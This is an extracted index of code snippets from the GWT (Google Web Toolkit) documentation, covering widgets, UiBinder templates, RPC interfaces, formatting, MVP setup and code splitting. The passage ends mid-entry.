GWT\nDESCRIPTION: Example showing how to create a simple CellList widget that displays days of the week using TextCell. Demonstrates cell widget initialization, data setting, and basic configuration.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellWidgets.md#2025-04-09_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\n/**\n * Example of {@link CellList}. This example shows a list of the days of the week.\n */\npublic class CellListExample implements EntryPoint {\n\n  // The list of data to display.\n  private static final List<String> DAYS = Arrays.asList(\"Sunday\", \"Monday\",\n      \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\");\n\n  public void onModuleLoad() {\n    // Create a cell to render each value in the list.\n    TextCell textCell = new TextCell();\n\n    // Create a CellList that uses the cell.\n    CellList<String> cellList = new CellList<String>(textCell);\n\n    // Set the total row count. This isn't strictly necessary, but it affects\n    // paging calculations, so its good habit to keep the row count up to date.\n    cellList.setRowCount(DAYS.size(), true);\n\n    // Push the data into the widget.\n    cellList.setRowData(0, DAYS);\n\n    // Add it to the root panel.\n    RootPanel.get().add(cellList);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Checking for Duplicate Stocks in GWT StockWatcher\nDESCRIPTION: Checks if a stock symbol already exists in the stocks ArrayList to prevent duplicate entries. This code is part of the addStock method, which handles adding new stocks to the tracking list.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/codeclient.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\n// Don't add the stock if it's already in the table.\nif (stocks.contains(symbol))\n  return;\n```\n\n----------------------------------------\n\nTITLE: Complete History Implementation in GWT TabPanel Application\nDESCRIPTION: Full Java implementation of browser history support in a GWT application using TabPanel. The code demonstrates how to add history tokens when tabs are selected and how to handle history change events to restore application state.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsHistory.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nimport com.google.gwt.core.client.EntryPoint;\\nimport com.google.gwt.event.logical.shared.SelectionEvent;\\nimport com.google.gwt.event.logical.shared.SelectionHandler;\\nimport com.google.gwt.event.logical.shared.ValueChangeEvent;\\nimport com.google.gwt.event.logical.shared.ValueChangeHandler;\\nimport com.google.gwt.user.client.History;\\nimport com.google.gwt.user.client.ui.HTML;\\nimport com.google.gwt.user.client.ui.RootPanel;\\nimport com.google.gwt.user.client.ui.TabPanel;\\n\\n/**\\n * Entry point classes define <code>onModuleLoad()</code>.\\n */\\npublic class BrowserHistoryExample implements EntryPoint {\\n\\n  TabPanel tabPanel;\\n  /**\\n   * This is the entry point method.\\n   */\\n  public void onModuleLoad() {\\n    tabPanel = new TabPanel();\\n\\n    tabPanel.add(new HTML(\"<h1>Page 0 Content: Llamas</h1>\"), \" Page 0 \");\\n    tabPanel.add(new HTML(\"<h1>Page 1 Content: Alpacas</h1>\"), \" Page 1 \");\\n    tabPanel.add(new HTML(\"<h1>Page 2 Content: Camels</h1>\"), \" Page 2 \");\\n\\n    tabPanel.addSelectionHandler(new SelectionHandler<Integer>(){\\n      public void onSelection(SelectionEvent<Integer> event) {\\n        History.newItem(\"page\" + event.getSelectedItem());\\n     );\\n\\n    History.addValueChangeHandler(new ValueChangeHandler<String>() {\\n      public void onValueChange(ValueChangeEvent<String> event) {\\n        String historyToken = event.getValue();\\n\\n        // Parse the history token\\n        try {\\n          if (historyToken.substring(0, 4).equals(\"page\")) {\\n            String tabIndexToken = historyToken.substring(4, 5);\\n            int tabIndex = Integer.parseInt(tabIndexToken);\\n            // Select the specified tab panel\\n            tabPanel.selectTab(tabIndex);\\n          } else {\\n            tabPanel.selectTab(0);\\n          }\\n\\n        } catch (IndexOutOfBoundsException e) {\\n          tabPanel.selectTab(0);\\n        }\\n      }\\n    });\\n\\n    tabPanel.selectTab(0);\\n    RootPanel.get().add(tabPanel);\\n  }\\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a ClientBundle Interface in Java\nDESCRIPTION: Example of creating a ClientBundle interface with various resource types including CSS, text configuration, and binary data resources.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\npublic interface MyResources extends ClientBundle {\n  public static final MyResources INSTANCE =  GWT.create(MyResources.class);\n\n  @Source(\"my.css\")\n  public CssResource css();\n\n  @Source(\"config.xml\")\n  public TextResource initialConfiguration();\n\n  @Source(\"manual.pdf\")\n  public DataResource ownersManual();\n}\n```\n\n----------------------------------------\n\nTITLE: StockPriceServiceAsync Interface - Java\nDESCRIPTION: Asynchronous interface definition for client-side service calls\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/RPC.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport com.google.gwt.user.client.rpc.AsyncCallback;\n\npublic interface StockPriceServiceAsync {\n\n  void getPrices(String[] symbols, AsyncCallback<StockPrice[]> callback);\n\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a Basic GWT Module in XML\nDESCRIPTION: Example of a simple GWT module XML file that inherits from the User module and specifies an entry point class. The module is renamed to 'dynatable' for shorter reference.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideOrganizingProjects.md#2025-04-09_snippet_3\n\nLANGUAGE: XML\nCODE:\n```\n<module rename-to=\"dynatable\">\n    <inherits name=\"com.google.gwt.user.User\" />\n    <entry-point class=\"com.google.gwt.sample.dynatable.client.DynaTable\" />\n </module>\n```\n\n----------------------------------------\n\nTITLE: Making HTTP Requests with RequestBuilder in GWT\nDESCRIPTION: Example of making an HTTP GET request using GWT's RequestBuilder class. The code demonstrates how to create a request, handle responses and errors through a RequestCallback implementation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideServerCommunication.md#2025-04-09_snippet_13\n\nLANGUAGE: java\nCODE:\n```\nimport com.google.gwt.http.client.*;\n...\n\nString url = \"http://www.myserver.com/getData?type=3\";\nRequestBuilder builder = new RequestBuilder(RequestBuilder.GET, URL.encode(url));\n\ntry {\n  Request request = builder.sendRequest(null, new RequestCallback() {\n    public void onError(Request request, Throwable exception) {\n       // Couldn't connect to server (could be timeout, SOP violation, etc.)\n    }\n\n    public void onResponseReceived(Request request, Response response) {\n      if (200 == response.getStatusCode()) {\n          // Process the response in response.getText()\n      } else {\n        // Handle the error.  Can get the status text from response.getStatusText()\n      }\n    }\n  });\n} catch (RequestException e) {\n  // Couldn't connect to server\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Stock Data Table in Java GWT\nDESCRIPTION: Implementation of the onModuleLoad method to create a FlexTable for displaying stock data. This code sets up the header row with column labels for Symbol, Price, Change, and Remove.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/buildui.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.user.client.ui.Button;\nimport com.google.gwt.user.client.ui.FlexTable;\nimport com.google.gwt.user.client.ui.HorizontalPanel;\nimport com.google.gwt.user.client.ui.Label;\nimport com.google.gwt.user.client.ui.TextBox;\nimport com.google.gwt.user.client.ui.VerticalPanel;\n\npublic class StockWatcher implements EntryPoint {\n\n  private VerticalPanel mainPanel = new VerticalPanel();\n  private FlexTable stocksFlexTable = new FlexTable();\n  private HorizontalPanel addPanel = new HorizontalPanel();\n  private TextBox newSymbolTextBox = new TextBox();\n  private Button addStockButton = new Button(\"Add\");\n  private Label lastUpdatedLabel = new Label();\n\n  /**\n   * Entry point method.\n   */\n  public void onModuleLoad() {\n    // Create table for stock data.\n    stocksFlexTable.setText(0, 0, \"Symbol\");\n    stocksFlexTable.setText(0, 1, \"Price\");\n    stocksFlexTable.setText(0, 2, \"Change\");\n    stocksFlexTable.setText(0, 3, \"Remove\");\n\n    // TODO Assemble Add Stock panel.\n    // TODO Assemble Main panel.\n    // TODO Associate the Main panel with the HTML host page.\n    // TODO Move cursor focus to the input box.\n\n  }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Basic HTML Structure with UiBinder XML\nDESCRIPTION: Demonstrates a simple UiBinder XML template that defines a basic HTML structure with a div and span element. The span has a ui:field attribute to allow programmatic access.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_0\n\nLANGUAGE: XML\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'>\n  <div>\n    Hello, <span ui:field='nameSpan'/>.\n  </div>\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Implementing PaperDrawPanel Layout in GWT UiBinder\nDESCRIPTION: Sets up the basic responsive layout structure using PaperDrawPanel with drawer and main content areas, including menu items and toolbar components.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-buildui.md#2025-04-09_snippet_6\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'\n             xmlns:g='urn:import:com.google.gwt.user.client.ui'\n             xmlns:p='urn:import:com.vaadin.polymer.paper.widget'\n             xmlns:i='urn:import:com.vaadin.polymer.iron.widget'>\n\n  <ui:style>\n     paper-icon-item {\n       position: relative;\n       overflow: hidden;\n     }\n  </ui:style>\n\n  <g:HTMLPanel>\n    <p:PaperDrawerPanel ui:field=\"drawerPanel\">\n        <div drawer=\"\">\n            <p:PaperHeaderPanel mode=\"seamed\">\n                <p:PaperToolbar/>\n                <p:PaperIconItem ui:field=\"menuClearAll\">\n                    <i:IronIcon icon=\"delete\" attributes=\"item-icon\"/>\n                    <div>Clear All</div>\n                    <p:PaperRipple/>\n                </p:PaperIconItem>\n                <p:PaperIconItem ui:field=\"menuClearDone\">\n                    <i:IronIcon icon=\"clear\" attributes=\"item-icon\"/>\n                    <div>Clear Done</div>\n                    <p:PaperRipple/>\n                </p:PaperIconItem>\n                <p:PaperIconItem ui:field=\"menuSettings\">\n                    <i:IronIcon icon=\"settings\" attributes=\"item-icon\"/>\n                    <div>Settings</div>\n                    <p:PaperRipple/>\n                </p:PaperIconItem>\n                <p:PaperIconItem ui:field=\"menuAbout\">\n                    <i:IronIcon icon=\"help\" attributes=\"item-icon\"/>\n                    <div>About</div>\n                    <p:PaperRipple/>\n                </p:PaperIconItem>\n            </p:PaperHeaderPanel>\n        </div>\n        <div main=\"\">\n            <p:PaperHeaderPanel mode=\"seamed\">\n                <p:PaperToolbar>\n                    <p:PaperIconButton ui:field=\"menu\" icon=\"more-vert\"\n                        attributes=\"paper-drawer-toggle\"/>\n                    <span>Todo List</span>\n                </p:PaperToolbar>\n            </p:PaperHeaderPanel>\n        </div>\n    </p:PaperDrawerPanel>\n  </g:HTMLPanel>\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: JavaScript Equivalent of Java Lambda Callback\nDESCRIPTION: This JavaScript code shows the equivalent functionality of the Java code that uses a lambda callback. It demonstrates what the Java code compiles to in JavaScript.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJsInterop.md#2025-04-09_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nvar element = document.createElement(\"button\");\nelement.addEventListener(\"click\", (event) => {\n  \n  console.log(\"clicked!\");\n});\n```\n\n----------------------------------------\n\nTITLE: Custom Number Formatting Pattern in GWT\nDESCRIPTION: Creating a custom number format using a pattern string with NumberFormat to control digits and precision in the output.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsFormatting.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\ndouble value = 12345.6789;\nString formatted = NumberFormat.getFormat(\"000000.000000\").format(value);\n// prints 012345.678900 in the default locale\nGWT.log(\"Formatted string is\" + formatted, null);\n```\n\n----------------------------------------\n\nTITLE: Persisting Entity Relationships with RequestFactory in Java GWT\nDESCRIPTION: Shows how to create and persist related entities in a single request. This example creates a new Person and Address simultaneously, with RequestFactory handling the object graph in a single server request.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_19\n\nLANGUAGE: java\nCODE:\n```\nPersonRequest context = requestFactory.personRequest();\nAddressProxy address = context.create(AddressProxy.class);\nPersonProxy person = context.create(PersonProxy.class);\nperson.setAddress(address);\ncontext.persist().using(person).fire(...);\n```\n\n----------------------------------------\n\nTITLE: Initializing GWT MVP Application\nDESCRIPTION: Entry point implementation showing how to initialize and wire together Activities, Places, and their managers in a GWT MVP application.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideMvpActivitiesAndPlaces.md#2025-04-09_snippet_13\n\nLANGUAGE: java\nCODE:\n```\npublic class HelloMVP implements EntryPoint {\n    private Place defaultPlace = new HelloPlace(\"World!\");\n    private SimplePanel appWidget = new SimplePanel();\n\n    public void onModuleLoad() {\n        ClientFactory clientFactory = GWT.create(ClientFactory.class);\n        EventBus eventBus = clientFactory.getEventBus();\n        PlaceController placeController = clientFactory.getPlaceController();\n\n        // Start ActivityManager for the main widget with our ActivityMapper\n        ActivityMapper activityMapper = new AppActivityMapper(clientFactory);\n        ActivityManager activityManager = new ActivityManager(activityMapper, eventBus);\n        activityManager.setDisplay(appWidget);\n\n        // Start PlaceHistoryHandler with our PlaceHistoryMapper\n        AppPlaceHistoryMapper historyMapper= GWT.create(AppPlaceHistoryMapper.class);\n        PlaceHistoryHandler historyHandler = new PlaceHistoryHandler(historyMapper);\n        historyHandler.register(placeController, eventBus, defaultPlace);\n\n        RootPanel.get().add(appWidget);\n        // Goes to the place represented on URL else default place\n        historyHandler.handleCurrentHistory();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Paper Drawer Panel Layout in GWT UiBinder\nDESCRIPTION: This snippet demonstrates how to create a responsive drawer panel layout using Polymer paper elements in a GWT UiBinder XML file. It includes a drawer panel with menu items and a main content area with toolbar.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-buildui.md#2025-04-09_snippet_7\n\nLANGUAGE: XML\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'\n                 xmlns:g='urn:import:com.google.gwt.user.client.ui'>\n\n        <g:HTMLPanel>\n            <style>\n                paper-icon-item {\n                    position: relative;\n                    overflow: hidden;\n                }\n            </style>\n            <paper-drawer-panel ui:field=\"drawerPanel\">\n                <div drawer=\"\">\n                    <paper-header-panel mode=\"seamed\">\n                        <paper-toolbar/>\n                        <paper-icon-item ui:field=\"menuClearAll\">\n                            <iron-icon icon=\"delete\" item-icon=\"\"/>\n                            <div>Clear All</div>\n                            <paper-ripple/>\n                        </paper-icon-item>\n                        <paper-icon-item ui:field=\"menuClearDone\">\n                            <iron-icon icon=\"clear\" item-icon=\"\"/>\n                            <div>Clear Done</div>\n                            <paper-ripple/>\n                        </paper-icon-item>\n                        <paper-icon-item ui:field=\"menuSettings\">\n                            <iron-icon icon=\"settings\" item-icon=\"\"/>\n                            <div>Settings</div>\n                            <paper-ripple/>\n                        </paper-icon-item>\n                        <paper-icon-item ui:field=\"menuAbout\">\n                            <iron-icon icon=\"help\" item-icon=\"\"/>\n                            <div>About</div>\n                            <paper-ripple/>\n                        </paper-icon-item>\n                    </paper-header-panel>\n                </div>\n                <div main=\"\">\n                    <paper-header-panel mode=\"seamed\">\n                        <paper-toolbar>\n                            <paper-icon-button ui:field=\"menu\" icon=\"more-vert\" paper-drawer-toggle=\"\"/>\n                            <span>Todo List</span>\n                        </paper-toolbar>\n                    </paper-header-panel>\n                </div>\n            </paper-drawer-panel>\n        </g:HTMLPanel>\n    </ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Creating a Data Structure for Stock Symbols in GWT\nDESCRIPTION: Initializes an ArrayList to store stock symbols entered by the user in the StockWatcher application. This data structure will hold all the stock codes that are being tracked.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/codeclient.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npublic class StockWatcher implements EntryPoint {\n\n  private VerticalPanel mainPanel = new VerticalPanel();\n  private FlexTable stocksFlexTable = new FlexTable();\n  private HorizontalPanel addPanel = new HorizontalPanel();\n  private TextBox newSymbolTextBox = new TextBox();\n  private Button addStockButton = new Button(\"Add\");\n  private Label lastUpdatedLabel = new Label();\n  private ArrayList<String> stocks = new ArrayList<String>();\n```\n\n----------------------------------------\n\nTITLE: Using Scientific Notation Format in GWT\nDESCRIPTION: Example of using the scientific notation format provided by NumberFormat to format a numeric value.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsFormatting.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\ndouble value = 12345.6789;\nString formatted = NumberFormat.getScientificFormat().format(value);\n// prints 1.2345E4 in the default locale\nGWT.log(\"Formatted string is\" + formatted, null);\n```\n\n----------------------------------------\n\nTITLE: Implementing onFailure Method for RPC Error Handling in Java\nDESCRIPTION: This snippet shows how to implement the onFailure method to handle RPC errors, including displaying specific messages for delisted stocks.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/RPC.md#2025-04-09_snippet_18\n\nLANGUAGE: java\nCODE:\n```\npublic void onFailure(Throwable caught) {\n  // If the stock code is in the list of delisted codes, display an error message.\n  String details = caught.getMessage();\n  if (caught instanceof DelistedException) {\n    details = \"Company '\" + ((DelistedException) caught).getSymbol() + \"' was delisted\";\n  }\n\n  errorMsgLabel.setText(\"Error: \" + details);\n  errorMsgLabel.setVisible(true);\n}\n```\n\n----------------------------------------\n\nTITLE: Simplified Event Handling with UiHandler Annotations in GWT\nDESCRIPTION: Shows how to use the @UiHandler annotation to simplify event handling code in UiBinder owner classes, eliminating the need for anonymous inner classes.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_10\n\nLANGUAGE: java\nCODE:\n```\npublic class MyFoo extends Composite {\n  @UiField Button button;\n\n  public MyFoo() {\n    initWidget(button);\n  }\n\n  @UiHandler(\"button\")\n  void handleClick(ClickEvent e) {\n    Window.alert(\"Hello, AJAX\");\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining GWT RPC Asynchronous Service Interface\nDESCRIPTION: Example of the asynchronous version of the RPC service interface that includes the AsyncCallback parameter for handling responses.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideServerCommunication.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\npublic interface MyEmailServiceAsync {\n  void emptyMyInbox(String username, String password,\n      AsyncCallback<Void> callback);\n}\n```\n\n----------------------------------------\n\nTITLE: Testing GWT Presenter with JUnit and EasyMock\nDESCRIPTION: This snippet demonstrates how to write a unit test for a GWT presenter using JUnit and EasyMock. It tests the scenario where a user enters a meeting capacity that cannot be scheduled, expecting the save button to be disabled.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/testing_methodologies_using_gwt.md#2025-04-09_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\nimport static org.easymock.EasyMock.*;\n\npublic class PresenterTest extends TestCase {\n\n   @Test\n   public void test_an_unavailable_room_disables_the_save_button() {\n     final MeetingView view = createMock(MeetingView.class);\n     final RoomScheduler scheduler = createMock(RoomScheduler.class);\n\n     final Meeting meeting = new Meeting();\n     final Presenter presenter = new Presenter(meeting, view, scheduler);\n\n     // The schedule service will reply with no available capacity\n     expect(scheduler.canAcceptCapacityFor(meeting)).andReturn(false);\n     view.disableSaveButton();\n     replay(scheduler);\n     replay(view);\n     presenter.requiredCapacityChanged(new FakeTextContainer(\"225\"));\n\n     verify(scheduler);\n     verify(view);\n\n     assertEquals(\"Should have updated the model's capacity\", 225, meeting.getCapacity());\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Locale via HTML Meta Tag\nDESCRIPTION: Example of setting GWT locale using HTML meta tag in the host page.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nLocale.md#2025-04-09_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<html>\n  <head>\n    <meta name=\"gwt:property\" content=\"locale=ja_JP\">\n  </head>\n  <body>\n    <!-- Load the GWT compiled module code                           -->\n    <script src=\"com.google.gwt.examples.i18n.ColorNameLookupExample.nocache.js \" />\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Configuring AutoBean in GWT Module XML\nDESCRIPTION: XML configuration required to enable AutoBean framework in a GWT module file.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideAutoBeans.md#2025-04-09_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<inherits name=\"com.google.web.bindery.autobean.AutoBean\"/>\n```\n\n----------------------------------------\n\nTITLE: GWT Hello World With Code Splitting Implementation\nDESCRIPTION: Demonstrates how to implement code splitting using GWT.runAsync() to defer loading of the alert functionality. Shows handling of both successful and failed code downloads.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodeSplitting.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\npublic class Hello implements EntryPoint {\n  public void onModuleLoad() {\n    Button b = new Button(\"Click me\", new ClickHandler() {\n      public void onClick(ClickEvent event) {\n        GWT.runAsync(new RunAsyncCallback() {\n          public void onFailure(Throwable caught) {\n            Window.alert(\"Code download failed\");\n          }\n\n          public void onSuccess() {\n            Window.alert(\"Hello, AJAX\");\n          }\n        });\n      }\n    });\n\n    RootPanel.get().add(b);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating DockLayoutPanel Structure in GWT\nDESCRIPTION: Shows how to create an application-level structure using DockLayoutPanel with header, footer, navigation, and content areas.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiPanels.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nDockLayoutPanel p = new DockLayoutPanel(Unit.EM);\np.addNorth(new HTML(\"header\"), 2);\np.addSouth(new HTML(\"footer\"), 2);\np.addWest(new HTML(\"navigation\"), 10);\np.add(new HTML(content));\n```\n\n----------------------------------------\n\nTITLE: Exporting Instance Methods for JavaScript in GWT\nDESCRIPTION: This example demonstrates how to export an instance method from Java to be used in JavaScript. It uses a closure to maintain the correct 'this' context when called from JavaScript.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJSNI.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\npackage mypackage;\n\npublic class Account {\n    private int balance = 0;\n    public int add(int amt) {\n      balance += amt;\n    }\n\n    public native void exportAdd() /*-{\n        var that = this;\n        $wnd.add = $entry(function(amt) {\n          that.@mypackage.Account::add(I)(amt);\n        });\n    }-*/;\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Cookies Class in GWT\nDESCRIPTION: The Cookies.getCookie() method is now static, eliminating the need to instantiate the class. The class also now supports setting cookies.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_23\n\nLANGUAGE: java\nCODE:\n```\nString value = Cookies.getCookie(\"name\");\nCookies.setCookie(\"name\", \"value\");\n```\n\n----------------------------------------\n\nTITLE: Styling GWT Components with CssResource\nDESCRIPTION: Demonstrates styling using GWT's CssResource to customize toolbar, header text, and content panel appearance.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-buildui.md#2025-04-09_snippet_8\n\nLANGUAGE: xml\nCODE:\n```\n<ui:style>\n  .toolbar {\n    background: #4285f4 !important;\n   }\n  .header {\n    font-size: 200%;\n    margin-left: 50px;\n    background: #4285f4 !important;\n   }\n  .content {\n    padding: 15px;\n   }\n   ...\n</ui:style>\n<g:HTMLPanel>\n   ...\n    <div main=\"\">\n        <p:PaperHeaderPanel mode=\"seamed\">\n            <p:PaperToolbar addStyleNames=\"{style.toolbar}\">\n                <p:PaperIconButton ui:field=\"menu\" icon=\"more-vert\"\n                    attributes=\"paper-drawer-toggle\"/>\n                <span class=\"{style.header}\">Todo List</span>\n            </p:PaperToolbar>\n            <g:HTMLPanel ui:field=\"content\"\n                   addStyleNames=\"{style.content} vertical center-justified layout\"/>\n        </p:PaperHeaderPanel>\n    </div>\n   ...\n</g:HTMLPanel>\n```\n\n----------------------------------------\n\nTITLE: Importing Window Class in Java for GWT\nDESCRIPTION: This snippet shows the import statement needed to use the Window class in a GWT application, which is used for displaying alert dialogs.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/manageevents.md#2025-04-09_snippet_4\n\nLANGUAGE: Java\nCODE:\n```\nimport com.google.gwt.user.client.Window;\n```\n\n----------------------------------------\n\nTITLE: Optimized CSS After Basic Minification in GWT\nDESCRIPTION: Shows the result of GWT's basic CSS minification process, which removes comments, whitespace, and empty rules to produce more compact CSS while preserving the original functionality.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_26\n\nLANGUAGE: css\nCODE:\n```\n.div{background:blue;}\n```\n\n----------------------------------------\n\nTITLE: Adding DockLayoutPanel to RootLayoutPanel in GWT\nDESCRIPTION: This Java code shows how to add the DockLayoutPanel structure to a RootLayoutPanel using UiBinder. It demonstrates the necessary setup in the onModuleLoad method.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiPanels.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\ninterface Binder extends UiBinder<Widget, BasicApp> { }\nprivate static final Binder binder = GWT.create(Binder.class);\n\npublic void onModuleLoad() {\n  RootLayoutPanel.get().add(binder.createAndBindUi());\n}\n```\n\n----------------------------------------\n\nTITLE: Item UiBinder XML Implementation\nDESCRIPTION: XML template for individual todo items using Polymer elements and custom styling.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-applogic.md#2025-04-09_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'\n             xmlns:g='urn:import:com.google.gwt.user.client.ui'\n             xmlns:p='urn:import:com.vaadin.polymer.paper.widget'>\n\n  <div class=\"item vertical center-justified layout\">\n    <style>\n      .title {\n        padding-left: 20px;\n        font-size: 150%;\n        font-weight: normal;\n      }\n      .done {\n        text-decoration: line-through;\n      }\n      .paper-checkbox {\n        top: -2px;\n      }\n    </style>\n    <div class=\"vertical-section\">\n      <h4>\n        <paper-checkbox ui:field=\"done\"/>\n        <span ui:field=\"title\" class='title'>Go to Google</span>\n      </h4>\n      <div ui:field=\"description\"/>\n    </div>\n  </div>\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Configuring GWT Module for Validation\nDESCRIPTION: XML configuration for the GWT module to inherit Hibernate Validator and specify the validator factory implementation using a replace-with directive.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideValidation.md#2025-04-09_snippet_3\n\nLANGUAGE: xml\nCODE:\n```\n<inherits name=\"org.hibernate.validator.HibernateValidator\" />\n<replace-with\n  class=\"com.google.gwt.sample.validation.client.SampleValidatorFactory\">\n  <when-type-is class=\"javax.validation.ValidatorFactory\" />\n</replace-with>\n```\n\n----------------------------------------\n\nTITLE: Defining GWT RPC Asynchronous Service Interface in Java\nDESCRIPTION: Creates the MusicStoreServiceAsync interface with asynchronous versions of the MusicStoreService methods using AsyncCallback.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\npublic interface MusicStoreServiceAsync {\n  public void getAccounts(AsyncCallback<List<Account>> callback);\n\n  public void getRecords(AsyncCallback<List<Record>> callback);\n\n  public void saveAccount(Account accountDTO, AsyncCallback<Long> callback);\n\n  public void saveRecord(Record record, AsyncCallback<Long> callback);\n\n  public void saveRecordToAccount(Account accountDTO, Record recordDTO,\nAsyncCallback<Void> callback);\n}\n```\n\n----------------------------------------\n\nTITLE: Scheduling Work with Timer in Java for GWT\nDESCRIPTION: Demonstrates how to create and schedule a Timer instance to execute code after a specified delay. The example shows setting up a timer to display an alert after 2 seconds.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsDelayed.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nTimer timer = new Timer() {\n  public void run() {\n    Window.alert(\"Timer expired!\");\n  }\n};\n\n// Execute the timer to expire 2 seconds in the future\ntimer.schedule(2000);\n```\n\n----------------------------------------\n\nTITLE: CSS Property Merging Example in GWT\nDESCRIPTION: Demonstrates how GWT's CssResource optimizer merges rules with identical properties to reduce CSS size. Shows the input CSS with separate rules that have the same property values.\nSOURCE: 